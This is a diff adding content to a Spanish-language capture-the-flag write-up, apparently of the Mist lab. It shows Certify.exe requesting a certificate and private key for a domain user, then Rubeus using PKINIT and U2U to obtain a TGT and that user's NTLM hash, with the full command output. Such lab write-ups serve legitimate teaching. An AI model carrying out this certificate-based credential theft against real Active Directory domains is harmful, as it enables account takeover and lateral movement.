@@ -678,12 +678,110 @@ Certify completed in 00:00:09.9699584
 
 ```
 
-
 El análisis de las plantillas disponibles mediante Certify.exe reveló que la plantilla User admite el uso de
 Client Authentication, lo que la convierte en un vector idóneo para la obtención de un certificado válido
 asociado  a  la  identidad  de  brandon.keywarp. A  partir  de  esta  plantilla,  se  procedió  a  generar  tanto  el
 certificado como la clave privada correspondientes, elementos esenciales  para la explotación  del flujo
 PKINIT descrito previamente.
+
+```text
+PS C:\xampp\htdocs\herramientas> .\Certify.exe request /user:Brandon.Keywarp /ca:DC01.mist.htb\mist-DC01-CA /template:user
+
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v1.1.0
+
+[*] Action: Request a Certificates
+
+[*] Current user context    : MIST\Brandon.Keywarp
+[*] No subject name specified, using current context as subject.
+
+[*] Template                : user
+[*] Subject                 : CN=Brandon.Keywarp, CN=Users, DC=mist, DC=htb
+
+[*] Certificate Authority   : DC01.mist.htb\mist-DC01-CA
+
+[*] CA Response             : The certificate had been issued.
+[*] Request ID              : 61
+
+[*] cert.pem         :
+
+-----BEGIN RSA PRIVATE KEY-----
+MIIEowIBAAKCAQEAutj2Me81z/WOhe/rfxY5JJONKFRPhHq6olAW6X5l7WAFqBAr
+Seo45H5GsTjKT5pUhm8XJjgK/N+n27BIpdFhdNEG6d8qpzCUAqqDvbXxvdLP23B/
+uibDGm2FlulAiU5fkEYsMZCZyZFnfrpAE8dEzdjRYftF8fz+9nqcQbVEGru94jku
+3hs2/qPkHBNAUUhFw3kd9n5J0E1DCxq0qiyUkU2cvzuAdsIftiGhtGS4CGaf4G0B
+DvVYk01bVRSdSZhlPrt3FtOs84Vew/kJCrNFdnDWH1VLO1B+/nZzHvpaaNI496xg
+v0Ls3+FbJImuSt/7mVGaDrQH1rWoAysuW+XurQIDAQABAoIBAFP1tENh8zNca0vC
+MHct/EV0TCTIJeco4v6WsIUBeDm/QStxAJK5PhFmsMtn8njsp3i1KJjS7BUPRzVP
+tIVWXc2JM+sZjegMyyWbi5FO1a7vsNkxZyO10Uvp1PKoI4jPf9+ruKYZDRHnVbM7
+bBm3HDLHb+bwa1C+167YD6jzFARSfKDZHdmnzypbx3aOhG40k7FuWaH5OJluKsUA
+85mW957p3842kmEXszhmvwUjZ/Bc0VA8+Ro3RL3RWOhZgPCsOJnNHfUpkeiyX8gy
+5sLCz2N7vNRCgIDJ9z8pgh49oV6y4pyVSJMQUMqt4mKqSkX8YpAjHvfaEfa3bU4c
+/LdinD0CgYEAwiot5ZgZYMBS8XNpmSTRpgKwzbmv6Gxb4cuEV+oZsnTsQrvAIYak
+B0HtbmwgLGsbLYPVneeR3hNxep568ua5aIKiXuYqc4msfn0jHQDILvpNTYeS+8Wt
+k6KTWdSk3NXP8pVKdIfYkcXwN20/+rhSDPLqsKseFgOqHj2MWQyAX/8CgYEA9lo5
+CkKKqFEeoC1B0vIAv3cMUXOkkiKS14Gjn2CcbkBtAui2gQ+V5BYg7J4xveNWFvr+
+HAaw5hDZPM0B2T1rk6CoHR3YRSfHJ9UboaoXKPazQsVMepmuoyCy2ajqeXWovAFR
+Q/yS0rDfXtdH64A02+l9E/EC//YH7i4XHqQZMVMCgYEAnHV0qpAX0xjnPV1s+FTt
+A0MjyYMZtsaqe5aNvHIN5vnE8DlupxVh099SPiqu+lwMeG7FkgpqRnOQe+h81oMJ
+YKfzw1jhWFzWPM8Fnndk2EYmSJU44dz29AKLjlWFy9YXTTjz2FcnMsA3w9IrPhON
+OpX8fARHqCGn0dpy38btI20CgYBdGE9B30+Ct9T49uFPFADQWe6fwTHJv6L6KZVp
+nxq+Vz5awRJmxzr/jJU4lbd6aLSZzpPEh4rGBkvxvA8cxycmDKo7BpI54ARUuyXL
++/jwk/m+G80A756dKrgrpLem2p2/HkhVhtb9I7Xlozkcd8CB8kRACu31SEZK7cPy
+4lRa3QKBgDMryBJqcCkPoLl1knZ1vtdp6oAZZbVIdnsrhV1lRnFWDxeztrnAkt0B
+m3+jQbyUYWWFcDa6w2tcOUBe4souvLh2w4xBIEi/8z21m4doVYErJE2FKPq+RkeN
+EBOwX9oEKgKwe2m5RYMYmexhOKdFKQ7Q4za0dcuLRbqef6TFBAEV
+-----END RSA PRIVATE KEY-----
+-----BEGIN CERTIFICATE-----
+MIIGDzCCBPegAwIBAgITIwAAAD2uBJxZfkVcrgAAAAAAPTANBgkqhkiG9w0BAQsF
+ADBCMRMwEQYKCZImiZPyLGQBGRYDaHRiMRQwEgYKCZImiZPyLGQBGRYEbWlzdDEV
+MBMGA1UEAxMMbWlzdC1EQzAxLUNBMB4XDTI2MDMyNTIwMTU0MloXDTI3MDMyNTIw
+MTU0MlowVTETMBEGCgmSJomT8ixkARkWA2h0YjEUMBIGCgmSJomT8ixkARkWBG1p
+c3QxDjAMBgNVBAMTBVVzZXJzMRgwFgYDVQQDEw9CcmFuZG9uLktleXdhcnAwggEi
+MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC62PYx7zXP9Y6F7+t/Fjkkk40o
+VE+EerqiUBbpfmXtYAWoECtJ6jjkfkaxOMpPmlSGbxcmOAr836fbsEil0WF00Qbp
+3yqnMJQCqoO9tfG90s/bcH+6JsMabYWW6UCJTl+QRiwxkJnJkWd+ukATx0TN2NFh
++0Xx/P72epxBtUQau73iOS7eGzb+o+QcE0BRSEXDeR32fknQTUMLGrSqLJSRTZy/
+O4B2wh+2IaG0ZLgIZp/gbQEO9ViTTVtVFJ1JmGU+u3cW06zzhV7D+QkKs0V2cNYf
+VUs7UH7+dnMe+lpo0jj3rGC/Quzf4Vskia5K3/uZUZoOtAfWtagDKy5b5e6tAgMB
+AAGjggLpMIIC5TAXBgkrBgEEAYI3FAIECh4IAFUAcwBlAHIwKQYDVR0lBCIwIAYK
+KwYBBAGCNwoDBAYIKwYBBQUHAwQGCCsGAQUFBwMCMA4GA1UdDwEB/wQEAwIFoDBE
+BgkqhkiG9w0BCQ8ENzA1MA4GCCqGSIb3DQMCAgIAgDAOBggqhkiG9w0DBAICAIAw
+BwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFO3DsI7cMnfXo30Pa/yQgyp5
+cZZDMB8GA1UdIwQYMBaAFAJHtA9/ZUDlwTbDIo9S3fMCAFUcMIHEBgNVHR8Egbww
+gbkwgbaggbOggbCGga1sZGFwOi8vL0NOPW1pc3QtREMwMS1DQSxDTj1EQzAxLENO
+PUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1D
+b25maWd1cmF0aW9uLERDPW1pc3QsREM9aHRiP2NlcnRpZmljYXRlUmV2b2NhdGlv
+bkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCBuwYI
+KwYBBQUHAQEEga4wgaswgagGCCsGAQUFBzAChoGbbGRhcDovLy9DTj1taXN0LURD
+MDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZp
+Y2VzLENOPUNvbmZpZ3VyYXRpb24sREM9bWlzdCxEQz1odGI/Y0FDZXJ0aWZpY2F0
+ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRob3JpdHkwMwYDVR0R
+BCwwKqAoBgorBgEEAYI3FAIDoBoMGEJyYW5kb24uS2V5d2FycEBtaXN0Lmh0YjBP
+BgkrBgEEAYI3GQIEQjBAoD4GCisGAQQBgjcZAgGgMAQuUy0xLTUtMjEtMTA0NTgw
+OTUwOS0zMDA2NjU4NTg5LTI0MjYwNTU5NDEtMTExMDANBgkqhkiG9w0BAQsFAAOC
+AQEArUeH4EAE6EPmGMlVNBpAFkwRWDdmFO0qMqrs5UuD31NQqx+licCkpEHyJYKK
+cbvdJjyA8v0GGrukVZs2keUwldfKfWlaqDc+FrbAu38gUvCexQws0kO/JqMNX44h
+8GsZbZAqIzNqNM3R/2TAeqEOjmliINe/KoxOD9ymgKkozSDv752P5pZuOIjKGVeV
+El4RUurQgRmM27ZyqL3ETw/qkTgQprtDpvvYZigUN+S3Ighqx8a3fU4x6m3tzSe1
+aGkX/Iv/Cm/dzVfOqLgDCmBCE2Vge1hSF7CWeOcmQc/wPcPL0FzKQSo3+SnBvzUQ
+XBZ7dj8zO5PMeD3i6g2FyQyxIw==
+-----END CERTIFICATE-----
+
+
+[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+
+
+
+Certify completed in 00:00:12.0941978
+```
 
 Una vez generados, ambos artefactos fueron combinados en un único archivo cert.pem, que posteriormente
 se  transformó  en  un  contenedor  cert.pfx  siguiendo  las  instrucciones  proporcionadas  por  Certify.  Este
@@ -697,15 +795,58 @@ posteriormente emitió una solicitud U2U. Gracias a la posesión de la clave pri
 Rubeus pudo descifrar el session key y, con él, el PAC incluido en el TGS-REP, extrayendo finalmente el
 hash NTLM del usuario.
 
-24 de febrero de 2025
+```text
+PS C:\xampp\htdocs\herramientas> .\Rubeus.exe asktgt /user:Brandon.Keywarp /certificate:C:\xampp\htdocs\herramientas\cert.pfx /getcredentials /show /nowrap
 
-11
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.3.3
+
+[*] Action: Ask TGT
+
+[*] Got domain: mist.htb
+[*] Using PKINIT with etype rc4_hmac and subject: CN=Brandon.Keywarp, CN=Users, DC=mist, DC=htb
+[*] Building AS-REQ (w/ PKINIT preauth) for: 'mist.htb\Brandon.Keywarp'
+[*] Using domain controller: 192.168.100.100:88
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      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
+
+  ServiceName              :  krbtgt/mist.htb
+  ServiceRealm             :  MIST.HTB
+  UserName                 :  Brandon.Keywarp (NT_PRINCIPAL)
+  UserRealm                :  MIST.HTB
+  StartTime                :  3/25/2026 1:33:35 PM
+  EndTime                  :  3/25/2026 11:33:35 PM
+  RenewTill                :  4/1/2026 1:33:35 PM
+  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  KeyType                  :  rc4_hmac
+  Base64(key)              :  QXBdr7t3TLlNgMlraH7NjA==
+  ASREP (key)              :  C9CDD6935BE654711249FC0D1D868738
+
+[*] Getting credentials using U2U
+
+  CredentialInfo         :
+    Version              : 0
+    EncryptionType       : rc4_hmac
+    CredentialData       :
+      CredentialCount    : 1
+       NTLM              : DB03D6A77A2205BC1D07082740626CC9
+```
 
 Este resultado constituye un punto de inflexión en la intrusión, ya que disponer del hash NTLM permite
 autenticarse  frente  a  múltiples  servicios  del  dominio  y  utilizar  herramientas  ofensivas  con  plena
 funcionalidad.  Para  validar  la  integridad  del  hash  obtenido,  se  ejecutó  netexec  nuevamente,  esta  vez
 autenticando  explícitamente  como  brandon.keywarp.  La  autenticación  exitosa  confirmó  la  validez  del
 hash y habilitó la siguiente fase de enumeración y movimiento lateral dentro del dominio.
+
+<img src="assets/26.png">
 
 Gaining Access as MS01$
 
